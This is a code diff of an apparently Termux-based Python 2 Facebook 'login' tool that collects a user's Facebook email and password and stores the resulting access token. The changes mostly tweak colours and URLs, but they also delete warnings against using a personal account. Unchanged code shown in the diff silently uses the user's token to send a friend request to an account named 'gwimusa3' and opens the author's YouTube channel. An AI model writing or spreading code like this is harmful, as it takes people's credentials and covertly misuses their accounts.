@@ -112,10 +112,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;93mWrong Password"
-            os.system('xdg-open https://.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+            os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+        os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
 
 ##### LICENSE #####
 #=================#
@@ -161,15 +161,12 @@ def login1():
 	except (KeyError,IOError):
 		os.system('clear')
                 time.sleep(0.05)
-		print logo
-		jalan(' \033[1;91mWarning : \033[1;92mDo Not Use Your Personal Account' )
-		jalan(' \033[1;91mWarning : \033[1;92mUse a New Account To Login' )
-		jalan(' \033[1;91mWarning : \033[1;92mTermux All Version Work ' )                 
-		print "\033[1;95m•-----------------\033[1;91mKali.linux\033[1;95m-----------------•"
-		print('\033[1;97m[+]\033[1;95mLOGIN WITH FACEBOOK\x1b[1;97m' )
+		print logo                
+		print "\033[1;92m•-----------------\033[1;34mKali.linux\033[1;92m-----------------•"
+		print('\033[1;97m[+]\033[1;36mLOGIN WITH FACEBOOK\x1b[1;97m' )
 		print('	' )
 		id = raw_input('\033[1;97m[!] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
-		pwd = raw_input('\033[1;97m[+] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
+		pwd = raw_input('\033[1;97m[+] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;93m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -197,7 +194,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful•'
-				os.system('xdg-open https://youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+				os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
